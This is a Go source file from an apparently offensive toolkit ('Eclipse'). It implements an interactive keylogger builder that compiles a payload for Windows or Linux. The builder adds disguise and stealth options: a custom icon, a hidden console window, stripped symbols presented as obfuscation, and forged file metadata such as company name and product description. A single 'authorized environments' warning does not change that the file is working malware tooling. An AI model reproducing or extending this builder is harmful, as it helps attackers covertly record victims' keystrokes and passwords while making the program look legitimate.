package keylogger

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"programa/utils"
)

func LaunchKeylogger() {
	for {
		utils.ClearTerminal()
		showKeyloggerMenu()

		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("%sChoose an option: %s", utils.Green, utils.Reset)
		input, readErr := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if readErr != nil && input == "" {
			return
		}

		switch input {
		case "1":
			buildKeylogger()
		case "2":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
		}
	}
}

func showKeyloggerMenu() {
	fmt.Printf("\n%s╔═══════════════════════════════════════════════════════════════╗%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s║              KEYLOGGER BUILDER                                ║%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s╚═══════════════════════════════════════════════════════════════╝%s\n\n", utils.Purple, utils.Reset)

	fmt.Printf("%s  [1] Build Keylogger%s\n", utils.Red, utils.Reset)
	utils.PrintReturnOption("2")
}

func targetBuildGOOS() string {
	if v := strings.TrimSpace(os.Getenv("GOOS")); v != "" {
		return v
	}
	return runtime.GOOS
}

func eclipseModuleRoot() string {
	if v := strings.TrimSpace(os.Getenv("ECLIPSE_ROOT")); v != "" {
		return filepath.Clean(v)
	}
	try := func(start string) (string, bool) {
		for d := filepath.Clean(start); d != "" && d != "."; d = filepath.Dir(d) {
			if _, err := os.Stat(filepath.Join(d, "go.mod")); err == nil {
				return d, true
			}
		}
		return "", false
	}
	if wd, err := os.Getwd(); err == nil {
		if r, ok := try(wd); ok {
			return r
		}
	}
	if exe, err := os.Executable(); err == nil {
		if r, ok := try(filepath.Dir(exe)); ok {
			return r
		}
	}
	if wd, err := os.Getwd(); err == nil {
		return wd
	}
	return "."
}

func ldflagX(pkgVar, val string) string {
	val = strings.ReplaceAll(strings.ReplaceAll(val, "\n", " "), `"`, `'`)
	return "-X=" + pkgVar + "=" + val
}

func suggestedKeyloggerFilename(goos string) string {
	if goos == "windows" {
		return "eclipse_keylogger_windows.exe"
	}
	return "eclipse_keylogger_linux"
}

func buildKeylogger() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ BUILD KEYLOGGER ═══%s\n\n", utils.Red, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	tGOOS := targetBuildGOOS()
	defaultFilename := suggestedKeyloggerFilename(tGOOS)

	fmt.Printf("%sSuggested Windows name:%s eclipse_keylogger_windows.exe\n", utils.Blue, utils.Reset)
	fmt.Printf("%sSuggested Linux name:%s eclipse_keylogger_linux\n", utils.Blue, utils.Reset)
	fmt.Printf("%sOutput filename (default: %s): %s", utils.Green, defaultFilename, utils.Reset)
	filename, _ := reader.ReadString('\n')
	filename = strings.TrimSpace(filename)
	if filename == "" {
		filename = defaultFilename
	}
	if tGOOS == "windows" && !strings.HasSuffix(strings.ToLower(filename), ".exe") {
		filename += ".exe"
	}

	fmt.Printf("\n%sSelect image/icon (optional):%s\n", utils.Yellow, utils.Reset)
	icon := selectIconForKeylogger(reader)

	fmt.Printf("\n%sObfuscate code? (y/n): %s", utils.Yellow, utils.Reset)
	obfuscate, _ := reader.ReadString('\n')
	obfuscate = strings.ToLower(strings.TrimSpace(obfuscate))

	fmt.Printf("\n%sEmbed file information? (y/n): %s", utils.Yellow, utils.Reset)
	embedInfo, _ := reader.ReadString('\n')
	embedInfo = strings.ToLower(strings.TrimSpace(embedInfo))

	var fileDescription, companyName, productVersion string
	if embedInfo == "y" || embedInfo == "yes" {
		fmt.Printf("%sFile Description: %s", utils.Green, utils.Reset)
		fileDescription, _ = reader.ReadString('\n')
		fileDescription = strings.TrimSpace(fileDescription)

		fmt.Printf("%sCompany Name: %s", utils.Green, utils.Reset)
		companyName, _ = reader.ReadString('\n')
		companyName = strings.TrimSpace(companyName)

		fmt.Printf("%sProduct Version: %s", utils.Green, utils.Reset)
		productVersion, _ = reader.ReadString('\n')
		productVersion = strings.TrimSpace(productVersion)
	}

	root := eclipseModuleRoot()
	outPath := filename
	if !filepath.IsAbs(outPath) && filepath.Dir(outPath) == "." {
		_ = os.MkdirAll(filepath.Join(root, "target"), 0755)
		outPath = filepath.Join(root, "target", filepath.Base(filename))
	}
	outPath, _ = filepath.Abs(outPath)

	payloadDir := filepath.Join(root, "scripts", "keylogger", "payload")
	sysoPath := filepath.Join(payloadDir, "rsrc.syso")
	_ = os.Remove(sysoPath)

	if icon != "" && tGOOS == "windows" {
		fmt.Printf("%s[*] Preparing icon resource...%s\n", utils.Yellow, utils.Reset)
		icoPath, cleanupIco, err := utils.MaterializeICO(icon)
		if err != nil {
			fmt.Printf("%s[!] Icon: %v%s\n", utils.Red, err, utils.Reset)
			utils.PauseForInput()
			return
		}
		defer cleanupIco()
		cmd := exec.Command("rsrc", "-ico", icoPath, "-o", sysoPath)
		cmd.Dir = payloadDir
		if err := cmd.Run(); err != nil {
			fmt.Printf("%s[!] rsrc failed (go install github.com/akavel/rsrc@latest): %v%s\n", utils.Red, err, utils.Reset)
			utils.PauseForInput()
			return
		}
		defer os.Remove(sysoPath)
	}

	fmt.Printf("\n%s[*] Building keylogger...%s\n", utils.Yellow, utils.Reset)

	var ld []string
	if tGOOS == "windows" {
		ld = append(ld, "-H=windowsgui")
	}
	if obfuscate == "y" || obfuscate == "yes" {
		ld = append(ld, "-s", "-w")
	}
	if embedInfo == "y" || embedInfo == "yes" {
		if fileDescription != "" {
			ld = append(ld, ldflagX("programa/scripts/keylogger.EmbedFileDescription", fileDescription))
		}
		if companyName != "" {
			ld = append(ld, ldflagX("programa/scripts/keylogger.EmbedCompanyName", companyName))
		}
		if productVersion != "" {
			ld = append(ld, ldflagX("programa/scripts/keylogger.EmbedProductVersion", productVersion))
		}
	}

	args := []string{"-C", root, "build", "-trimpath", "-o", outPath}
	if len(ld) > 0 {
		args = append(args, "-ldflags", strings.Join(ld, " "))
	}
	args = append(args, "./scripts/keylogger/payload")

	cmd := exec.Command("go", args...)
	cmd.Env = os.Environ()
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Printf("%s[!] Build failed:%s\n%s\n", utils.Red, utils.Reset, string(output))
		_ = os.Remove(sysoPath)
		utils.PauseForInput()
		return
	}

	fmt.Printf("\n%s[✓] Keylogger built successfully: %s%s\n", utils.Green, outPath, utils.Reset)
	fmt.Printf("%s[!] WARNING: Use only in authorized environments!%s\n", utils.Red, utils.Reset)
	utils.PauseForInput()
}

func selectIconForKeylogger(reader *bufio.Reader) string {
	root := eclipseModuleRoot()
	imgPath := filepath.Join(root, "img")
	return utils.SelectIconImage(reader, imgPath)
}
